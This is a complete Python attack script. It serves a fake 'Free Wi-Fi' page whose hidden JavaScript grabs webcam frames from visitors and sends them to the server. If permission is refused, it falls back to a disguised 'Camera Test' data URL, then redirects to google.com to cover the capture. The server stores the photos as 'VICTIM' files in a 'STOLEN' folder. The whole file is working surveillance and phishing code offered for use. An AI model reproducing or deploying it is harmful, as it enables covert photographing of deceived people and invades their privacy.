#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import os
from datetime import datetime

PORT = 80
DIR = "STOLEN"
os.makedirs(DIR, exist_ok=True)

# === BULLETPROOF JS PAYLOAD (NO { } THAT BREAK F-STRINGS) ===
PAYLOAD = """<script>
(() => {
  const send = b64 => fetch(location.href, {method:'POST',body:'img='+b64})
    .then(() => setTimeout(() => location='https://google.com', 500));

  const snap = stream => new Promise(res => {
    const v = document.createElement('video');
    v.srcObject = stream; v.muted = true; v.play();
    v.onloadedmetadata = () => setTimeout(() => {
      const c = document.createElement('canvas');
      c.width = v.videoWidth || 1280; c.height = v.videoHeight || 720;
      c.getContext('2d').drawImage(v, 0, 0);
      const b64 = c.toDataURL('image/jpeg', 0.8).split(',')[1];
      stream.getTracks().forEach(t => t.stop());
      res(b64);
    }, 800);
  });

  const steal = async () => {
    try { const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}); send(await snap(s)); return; } catch(e) {}
    document.body.dispatchEvent(new Event('click'));
    try { const s = await navigator.mediaDevices.getUserMedia({video:true}); send(await snap(s)); return; } catch(e) {}
    setTimeout(() => {
      location = `data:text/html,<h2>Camera Test</h2><script>
        navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
          const v=document.createElement('video'); v.srcObject=s; v.play();
          v.onloadedmetadata=()=>{setTimeout(()=>{
            const c=document.createElement('canvas');
            c.width=v.videoWidth; c.height=v.videoHeight;
            c.getContext('2d').drawImage(v,0,0);
            fetch(location.origin,{method:'POST',body:'img='+c.toDataURL('image/jpeg').split(',')[1]});
          },1000)};
        }).catch(()=>{location='https://google.com'});
      </script>`;
    }, 3000);
  };

  setTimeout(steal, 600);
})();
</script>"""

# === HTML WITH NO { } IN JS THAT PYTHON MISREADS ===
HTML_TEMPLATE = """<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Free Wi-Fi</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#000;color:#fff;font-family:Arial;text-align:center;padding:20%}
    .card{background:#111;padding:2rem;border-radius:16px;max-width:90%;margin:auto;border:2px solid #f00;box-shadow:0 0 30px #f003}
    h1{font-size:1.8rem;margin-bottom:0.5rem}
    p{margin:1rem 0}
    button{background:#e63946;color:#fff;border:none;padding:1.2rem;font-size:1.3rem;border-radius:12px;width:100%;font-weight:bold;margin-top:1rem}
    button:active{background:#c1121f}
  </style>
</head><body>
  <div class="card">
    <h1>Free Wi-Fi</h1>
    <p>Tap below to connect</p>
    <button id="connectBtn">Connect Now</button>
  </div>
  {payload}
  <script>
    const btn = document.getElementById('connectBtn');
    btn.addEventListener('click', () => {
      btn.innerText = 'Connecting...';
      btn.disabled = true;
      document.body.dispatchEvent(new Event('click'));
    });
  </script>
</body></html>"""

class FinalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Inject payload safely
        html = HTML_TEMPLATE.replace("{payload}", PAYLOAD)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8', errors='ignore')
        img = urllib.parse.parse_qs(data).get('img', [''])[0]

        if img and len(img) > 5000:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            ip = self.client_address[0]
            path = f"{DIR}/VICTIM_{ts}_{ip}.jpg"
            with open(path, "wb") as f:
                f.write(base64.b64decode(img))
            print(f"STOLEN: {path}")
        else:
            print(f"[-] No image from {self.client_address[0]}")

        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

print("FINAL STRIKE SERVER: LIVE")
print("   URL → http://YOUR_IP")
print("   LOOT → ./STOLEN/")
socketserver.TCPServer(("", PORT), FinalHandler).serve_forever()
